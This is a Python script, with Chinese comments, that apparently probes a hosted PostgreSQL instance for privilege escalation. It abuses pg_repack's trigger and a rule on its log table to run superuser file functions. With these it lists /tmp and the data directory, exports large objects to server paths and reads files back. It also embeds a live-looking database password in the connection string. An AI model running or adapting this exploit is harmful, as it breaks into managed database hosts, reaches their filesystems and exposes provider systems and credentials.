# -*- coding: utf-8 -*-
"""v9:lo_export 文件落点调试——/tmp 全列 + stat + 换 PGDATA 路径 + fire 错误显式化"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:300]

q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("CREATE TABLE k_src(id int)", fetch=False)
q("CREATE TABLE k_out(x text, n bigint)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)

def set_rule(expr):
    q("DROP RULE IF EXISTS r_x ON repack.log_%d" % oid, fetch=False)
    q("CREATE RULE r_x AS ON INSERT TO repack.log_%d DO ALSO %s" % (oid, expr), fetch=False)
    q("TRUNCATE k_out", fetch=False)

def fire():
    return q("INSERT INTO k_src VALUES (1)", fetch=False)

# [1] /tmp 全列基线
set_rule("INSERT INTO k_out(x) SELECT d FROM pg_ls_dir('/tmp') d")
r = fire()
print('[1] /tmp list:', q("SELECT x FROM k_out WHERE x IS NOT NULL"), '| fire:', r)

# [2] 大对象建 + export
set_rule("INSERT INTO k_out(x) SELECT lo_from_bytea(0, convert_to('PROBE_CONTENT_XYZ','UTF8'))::text")
fire()
loids = q("SELECT x FROM k_out")
loid = int(loids[0][0])
print('[2] loid:', loid)
set_rule("INSERT INTO k_out(x) SELECT 'exp' FROM (SELECT lo_export(%d, '/tmp/k_probe_x.txt')) s" % loid)
r = fire()
print('[3] export /tmp:', r, '| rows:', q("SELECT x FROM k_out"))

# [4] /tmp 再列
set_rule("INSERT INTO k_out(x) SELECT d FROM pg_ls_dir('/tmp') d")
r = fire()
files = [x[0] for x in q("SELECT x FROM k_out WHERE x IS NOT NULL")]
print('[4] /tmp after export:', files, '| fire:', r)

# [5] 换 $PGDATA 路径 export
set_rule("INSERT INTO k_out(x) SELECT 'exp2' FROM (SELECT lo_export(%d, current_setting('data_directory') || '/k_probe_x.txt')) s" % loid)
r = fire()
print('[5] export PGDATA:', r, '| rows:', q("SELECT x FROM k_out"))

# [6] PGDATA 列(找 k_probe)
set_rule("INSERT INTO k_out(x) SELECT d FROM pg_ls_dir(current_setting('data_directory')) d")
r = fire()
files = [x[0] for x in q("SELECT x FROM k_out WHERE x IS NOT NULL")]
print('[6] PGDATA after export:', [f for f in files if 'probe' in f], '| total:', len(files))

# [7] 若 PGDATA 有 → 读回
if any('k_probe' in f for f in files):
    set_rule("pg_read_file(current_setting('data_directory') || '/k_probe_x.txt')")
    r = fire()
    print('[7] PGDATA readback:', q("SELECT x FROM k_out WHERE x IS NOT NULL"), '| fire:', r)

# [8] stat 探测两路径
set_rule("INSERT INTO k_out(n) SELECT (pg_stat_file('/tmp/k_probe_x.txt')).size")
r = fire()
print('[8] stat /tmp:', q("SELECT n FROM k_out WHERE n IS NOT NULL"), '| fire:', r)
q("TRUNCATE k_out", fetch=False)
set_rule("INSERT INTO k_out(n) SELECT (pg_stat_file(current_setting('data_directory') || '/k_probe_x.txt')).size")
r = fire()
print('[8b] stat PGDATA:', q("SELECT n FROM k_out WHERE n IS NOT NULL"), '| fire:', r)

# 清理(删大对象;/tmp、PGDATA 的 probe 文件若存在尝试用 lo_export 覆盖为 0 字节或留记录)
q("SELECT lo_unlink(%d)" % loid, fetch=False)
print('[9] lo_unlink')

# 清理 DB 对象
q("DROP RULE IF EXISTS r_x ON repack.log_%d" % oid, fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('[final]:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
conn.close()
